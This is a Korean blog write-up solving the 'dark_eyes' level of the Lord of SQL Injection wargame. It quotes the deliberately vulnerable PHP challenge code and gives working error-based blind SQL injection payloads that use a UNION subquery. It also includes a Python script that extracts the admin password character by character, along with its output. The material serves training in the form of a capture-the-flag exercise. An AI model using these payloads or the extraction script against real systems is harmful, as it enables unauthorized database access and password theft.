---
title: "[Lord of SQL Injection] LoS - dark_eyes 문제풀이"
date: 2018-08-22
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이번에도 역시 `Error`를 기반으로 한 `Error Based Blind SQL Injection` 이다.
그런데 이번에는 이 전 문제랑은 약간 다르다.

<!--more-->

코드는 다음과 같다.  

```php
------------------------------------------------------------------------------------------
query : select id from prob_dark_eyes where id='admin' and pw=''
------------------------------------------------------------------------------------------

<?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit();
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
  highlight_file(__FILE__);
?>
```

이 전 문제에서 사용했던 `if`가 필터링 대상에 들어가 있고, `if`를 대체할 수 있는 `case`나 `when`도 필터링한다.
즉, 조건문을 사용할 수가 없다.
그래서 내가 처음에 생각했던 방법은 `and`와 `or`을 적절히 이용하는 것이다.
만약에 `1 or 0`이라는 조건이 있다면, 앞의 `1`이 이미 참이기 때문에 뒤의 `0`은 체크하지 않는다고 생각했다.
반면 `0 or 1`이라면, 앞의 `0`이 거짓이기 때문의 뒤의 `1`을 체크하는 것이다.
그래서 앞에 `pw`의 길이와 내용을 알기 위한 쿼리를 넣고 뒤에 에러를 유발하는 쿼리문을 넣는다면, 앞의 조건이 참이라면 뒤의 에러 유발용 쿼리가 실행되지 않아 정상적으로 페이지가 보일 것이라고 생각했던 것이다.
그런데 음... 내가 뭘 잘못 한 것인지 이건 아무리 해도 안됬다.

정확히는 쿼리 스트링을 `pw=1' or id='admin' and ord('a')=97 or 9e307*2`를 넣으면 앞의 `id='admin' and ord('a')=97`가 참이기 때문에 뒤의 `9e307*2`에 대해서 에러가 발생하지 않는다.
(9e307은 MySQL에서의 최대값이기 때문에 9e307*2를 하면 `DOUBLE value is out of range in '(9e307 * 2)'`라는 에러가 발생한다.)
그런데 `pw=1' or id='admin' and length(pw)>0 or 9e307*2`을 넣으면 무슨 조건을 넣더라도 무조건 에러가 나왔다.
왜 이러는지 이유를 모르겠다 ㅠㅠ
그래서 결국 다른 방법을 찾아보아서 아래와 같이 쿼리 스트링을 구성 해 문제를 풀었다.  

```plain
?pw=1' or id='admin' and (select 1 union select (length(pw)=1))#
```

이렇게 하면 만약 `length(pw)=1`이 참이라면 `1`을 반환하기 때문에 `select 1 union select 1`이 되어 한 행만 결과로 나온다.
하지만 거짓이라면 `select 1 union select 0`을 하게 되면, 2개의 행을 반환하기 때문에 `Subquery returns more than 1 row`라는 오류를 출력한다.
이를 바탕으로 `pw`를 알아내기 위해 아래와 같이 코드를 구현했다.  

```python
import requests

flag = ""
length = 0

url = "http://los.rubiya.kr/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 20):
	try:
		query = url + "1' or id='admin' and (select 1 union select (length(pw)=" + str(i) + "))%23"
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue

	if 'select id from prob_dark_eyes' in r.text:
		length = i
		break

print "[+] Found length : ", length

print "[+] Find password"

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = url + "1' or id='admin' and (select 1 union select (ord(substr(pw, " + str(j) + ", 1))=" + str(i) + "))%23"
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if 'select id from prob_dark_eyes' in r.text:
			flag += chr(i)
			print "[+] Found " + str(j), ":", flag
			break

print "[+] Found password : ", flag
print "[+] End"
```

그 결과 소문자와 숫자로 구성 된 8자리 `pw`값을 얻을 수 있었다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  8
[+] Find password
[+] Found 1 : 5
[+] Found 2 : 5a
[+] Found 3 : 5a2
[+] Found 4 : 5a2f
[+] Found 5 : 5a2f5
[+] Found 6 : 5a2f5d
[+] Found 7 : 5a2f5d3
[+] Found 8 : 5a2f5d3c
[+] Found password :  5a2f5d3c
[+] End
```

이 값을 쿼리스트링으로 넘겨주면 문제를 풀 수 있다.  

```plain
?pw=5a2f5d3c
```

---

```php
----------------------------------------------------------------------------------------------------
query : select id from prob_dark_eyes where id='admin' and pw='5a2f5d3c'
----------------------------------------------------------------------------------------------------

DARK_EYES Clear!
<?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit();
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
  highlight_file(__FILE__);
?>
```

---

```plain
DARK_EYES Clear!!
```